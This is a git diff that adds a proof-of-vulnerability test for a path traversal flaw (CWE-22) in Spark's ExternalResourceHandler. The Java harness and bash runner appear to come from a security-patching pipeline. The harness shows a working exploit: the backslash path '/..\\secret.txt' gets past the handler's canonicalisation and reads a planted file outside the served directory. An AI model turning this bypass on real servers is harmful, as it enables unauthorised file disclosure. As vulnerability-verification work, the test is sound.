@@ -1,0 +1,177 @@
+diff --git a/.security-pipeline/pov/PovExternalTraversal.java b/.security-pipeline/pov/PovExternalTraversal.java
+new file mode 100644
+index 0000000..6e75cd9
+--- /dev/null
++++ b/.security-pipeline/pov/PovExternalTraversal.java
+@@ -0,0 +1,119 @@
++package spark.resource;
++
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.io.FileOutputStream;
++import java.io.InputStream;
++
++/**
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in Spark's
++ * {@link spark.resource.ExternalResourceHandler}.
++ *
++ * The handler's only traversal protection is {@link spark.resource.UriPath#canonical(String)},
++ * which factors out "." / ".." path segments but ONLY recognises the forward
++ * slash '/' as a separator. A request path that uses backslashes (e.g.
++ * "/..\\secret.txt") therefore passes through canonical() unchanged.
++ *
++ * {@link spark.resource.ExternalResource}'s constructor then runs the combined
++ * path through StringUtils.cleanPath(), which converts every '\\' to '/' and
++ * normalises the resulting ".." segments -- escaping the configured base
++ * directory. The handler happily returns a live resource pointing at a file
++ * that lives OUTSIDE the served root, and its InputStream leaks that file's
++ * bytes. This mirrors the finder's trace (getResource -> ExternalResource ->
++ * getURL/ResourceUtils -> getFile).
++ *
++ * Exit code 0  => vulnerable behaviour reproduced (resource resolved and read
++ *                 outside the base directory).
++ * Exit code 1  => traversal blocked (a correct patch is in place).
++ */
++public class PovExternalTraversal {
++
++    /** Subclass only to reach the protected getResource(String) resolver. */
++    static final class Handler extends ExternalResourceHandler {
++        Handler(String base) {
++            super(base);
++        }
++
++        AbstractFileResolvingResource resolve(String path) throws Exception {
++            return getResource(path);
++        }
++    }
++
++    public static void main(String[] args) throws Exception {
++        // 1. Build an isolated served-root layout in a fresh temp directory.
++        File root = File.createTempFile("pov-ext-", "-root");
++        if (!root.delete() || !root.mkdirs()) {
++            throw new IllegalStateException("could not create temp root");
++        }
++
++        File base = new File(root, "public");        // the configured static-files base
++        if (!base.mkdirs()) {
++            throw new IllegalStateException("could not create base dir");
++        }
++        write(new File(base, "index.html"), "public-content");
++
++        // 2. A secret that lives OUTSIDE the served base (one level up).
++        File secret = new File(root, "secret.txt");
++        String secretContent = "TOP-SECRET-DO-NOT-SERVE-8f3a1c2b";
++        write(secret, secretContent);
++
++        String baseCanonical = base.getCanonicalPath();
++
++        // 3. Drive the REAL vulnerable resolver with an attacker-controlled path.
++        //    Backslash traversal bypasses UriPath.canonical().
++        String attackPath = "/..\\secret.txt";
++
++        Handler handler = new Handler(base.getAbsolutePath());
++        AbstractFileResolvingResource resource = handler.resolve(attackPath);
++
++        System.out.println("[POV] served base dir : " + baseCanonical);
++        System.out.println("[POV] attack path     : " + attackPath);
++
++        if (resource == null) {
++            System.out.println("[POV] getResource() returned null -> traversal blocked. Not vulnerable.");
++            System.exit(1);
++        }
++
++        ExternalResource external = (ExternalResource) resource;
++        File resolved = new File(external.getPath()).getCanonicalFile();
++        String resolvedPath = resolved.getCanonicalPath();
++        System.out.println("[POV] resolved file   : " + resolvedPath);
++
++        boolean escapesBase = !resolvedPath.equals(baseCanonical)
++                && !resolvedPath.startsWith(baseCanonical + File.separator);
++
++        // 4. Actually read the bytes through the project's own InputStream.
++        String served;
++        try (InputStream in = external.getInputStream()) {
++            served = readAll(in);
++        }
++        System.out.println("[POV] bytes served    : " + served);
++
++        boolean leaked = secretContent.equals(served);
++
++        if (escapesBase && leaked) {
++            System.out.println("[POV] VULNERABLE: ExternalResourceHandler served a file located "
++                    + "outside the configured base directory via backslash path traversal.");
++            System.exit(0);
++        }
++
++        System.out.println("[POV] Not exploited (escapesBase=" + escapesBase + ", leaked=" + leaked + ").");
++        System.exit(1);
++    }
++
++    private static void write(File f, String content) throws Exception {
++        try (FileOutputStream out = new FileOutputStream(f)) {
++            out.write(content.getBytes("UTF-8"));
++        }
++    }
++
++    private static String readAll(InputStream in) throws Exception {
++        ByteArrayOutputStream buf = new ByteArrayOutputStream();
++        byte[] tmp = new byte[4096];
++        int n;
++        while ((n = in.read(tmp)) != -1) {
++            buf.write(tmp, 0, n);
++        }
++        return new String(buf.toByteArray(), "UTF-8");
++    }
++}
+diff --git a/.security-pipeline/pov/out/spark/resource/PovExternalTraversal$Handler.class b/.security-pipeline/pov/out/spark/resource/PovExternalTraversal$Handler.class
+new file mode 100644
+index 0000000..c15bd54
+Binary files /dev/null and b/.security-pipeline/pov/out/spark/resource/PovExternalTraversal$Handler.class differ
+diff --git a/.security-pipeline/pov/out/spark/resource/PovExternalTraversal.class b/.security-pipeline/pov/out/spark/resource/PovExternalTraversal.class
+new file mode 100644
+index 0000000..8389d80
+Binary files /dev/null and b/.security-pipeline/pov/out/spark/resource/PovExternalTraversal.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..cc74e58
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,38 @@
++#!/usr/bin/env bash
++#
++# Proof-of-Vulnerability runner for CWE-022 path traversal in
++# spark.resource.ExternalResourceHandler.
++#
++# Runs INSIDE the project container at /workspace/repo.
++# Exit 0  => vulnerable behaviour reproduced (unpatched code).
++# Exit !0 => traversal blocked (patched) or build failure.
++set -euo pipefail
++
++REPO=/workspace/repo
++POV_DIR="$REPO/.security-pipeline/pov"
++cd "$REPO"
++
++# 1. Make sure the project's main classes are compiled.
++if [ ! -f "$REPO/target/classes/spark/resource/ExternalResourceHandler.class" ]; then
++  echo "[POV] compiling project (mvn compile)..."
++  mvn -B -q -DskipTests compile
++fi
++
++# 2. Locate the two runtime dependencies the handler needs on the classpath.
++SLF4J_JAR="$(find /root/.m2 -name 'slf4j-api-*.jar' 2>/dev/null | sort | tail -1)"
++SERVLET_JAR="$(find /root/.m2 -name 'javax.servlet-api-*.jar' 2>/dev/null | sort | tail -1)"
++if [ -z "$SLF4J_JAR" ] || [ -z "$SERVLET_JAR" ]; then
++  echo "[POV] could not locate slf4j-api / javax.servlet-api jars" >&2
++  exit 3
++fi
++
++CP="$REPO/target/classes:$SLF4J_JAR:$SERVLET_JAR"
++
++# 3. Compile the POV.
++OUT="$POV_DIR/out"
++rm -rf "$OUT"
++mkdir -p "$OUT"
++javac -d "$OUT" -cp "$CP" "$POV_DIR/PovExternalTraversal.java"
++
++# 4. Run it. Its own exit code decides vulnerable vs. patched.
++java -cp "$OUT:$CP" spark.resource.PovExternalTraversal
